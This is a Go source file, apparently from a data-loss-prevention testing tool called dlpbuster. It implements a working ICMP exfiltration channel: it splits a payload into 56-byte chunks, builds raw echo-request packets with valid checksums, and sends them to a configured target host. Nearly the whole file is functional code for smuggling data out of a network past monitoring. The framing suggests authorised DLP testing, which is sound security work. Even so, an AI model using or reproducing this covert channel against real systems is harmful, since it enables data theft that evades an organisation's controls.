// Package icmp implements an ICMP echo request exfiltration channel.
// Payload bytes are encoded into the data field of ICMP echo requests.
// Raw sockets require elevated privileges (root/CAP_NET_RAW on Linux).
package icmp

import (
"context"
"encoding/binary"
"fmt"
"net"
"os"
"time"

"github.com/hssn-research/dlpbuster/internal/channels"
"github.com/hssn-research/dlpbuster/internal/payload"
)

// Channel implements channels.Channel for ICMP exfiltration.
type Channel struct{}

// New returns a new ICMP Channel.
func New() *Channel { return &Channel{} }

// Name returns the channel identifier.
func (c *Channel) Name() string { return "icmp" }

// Description returns a one-line description.
func (c *Channel) Description() string {
	return "Exfiltrate payload in ICMP echo request data fields (requires CAP_NET_RAW / root)"
}

// Run executes the ICMP exfil. Requires raw socket access.
func (c *Channel) Run(ctx context.Context, cfg channels.ChannelConfig) channels.Result {
	result := channels.Result{Channel: c.Name()}
	start := time.Now()

	target := cfg.ICMPTarget
	if target == "" {
		target = cfg.ListenerAddr
	}
	if target == "" {
		result.Status = channels.StatusSkipped
		result.Evidence = []string{"icmp: no target configured (set channels.icmp.target in config)"}
		result.Duration = time.Since(start)
		return result
	}

	if os.Getuid() != 0 {
		result.Status = channels.StatusSkipped
		result.Evidence = []string{"icmp: requires root/CAP_NET_RAW — re-run with sudo or: sudo setcap cap_net_raw+ep ./bin/dlpbuster"}
		result.Duration = time.Since(start)
		return result
	}

	dst, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		result.Status = channels.StatusError
		result.Error = fmt.Errorf("icmp: resolve %q: %w", target, err)
		result.Duration = time.Since(start)
		return result
	}

	const chunkSize = 56
	chunks, _ := payload.Split(cfg.Payload, chunkSize)

	sent := 0
	total := len(chunks)
	var evidence []string

	for i, chunk := range chunks {
		select {
		case <-ctx.Done():
			result.Status = channels.StatusPartial
			result.Evidence = append(evidence, fmt.Sprintf("cancelled: %d/%d packets sent", sent, total))
			result.BytesSent = sent * chunkSize
			result.Duration = time.Since(start)
			return result
		default:
		}

		pkt := buildICMPEcho(i+1, os.Getpid()&0xffff, chunk)

		conn, dialErr := net.Dial("ip4:icmp", dst.IP.String())
		if dialErr != nil {
			result.Status = channels.StatusError
			result.Error = fmt.Errorf("icmp: dial: %w", dialErr)
			result.Duration = time.Since(start)
			return result
		}
		conn.SetDeadline(time.Now().Add(3 * time.Second)) //nolint:errcheck
		_, writeErr := conn.Write(pkt)
		conn.Close()

		if writeErr != nil {
			evidence = append(evidence, fmt.Sprintf("packet %d send err: %v", i, writeErr))
			result.Status = channels.StatusPartial
			result.BytesSent = sent * chunkSize
			result.Evidence = evidence
			result.Duration = time.Since(start)
			return result
		}
		sent++
		evidence = append(evidence, fmt.Sprintf("packet %d/%d → %s (%d bytes)", i+1, total, target, len(chunk)))
	}

	result.Status = channels.StatusPassed
	result.BytesSent = len(cfg.Payload)
	result.Evidence = append(evidence, fmt.Sprintf("%d/%d ICMP packets sent to %s", sent, total, target))
	result.Duration = time.Since(start)
	return result
}

// buildICMPEcho constructs a valid ICMP echo request packet.
func buildICMPEcho(seq, id int, data []byte) []byte {
	pkt := make([]byte, 8+len(data))
	pkt[0] = 8 // type: echo request
	pkt[1] = 0 // code
	binary.BigEndian.PutUint16(pkt[4:6], uint16(id))
	binary.BigEndian.PutUint16(pkt[6:8], uint16(seq))
	copy(pkt[8:], data)
	cs := icmpChecksum(pkt)
	binary.BigEndian.PutUint16(pkt[2:4], cs)
	return pkt
}

func icmpChecksum(b []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(b); i += 2 {
		sum += uint32(b[i])<<8 | uint32(b[i+1])
	}
	if len(b)%2 != 0 {
		sum += uint32(b[len(b)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
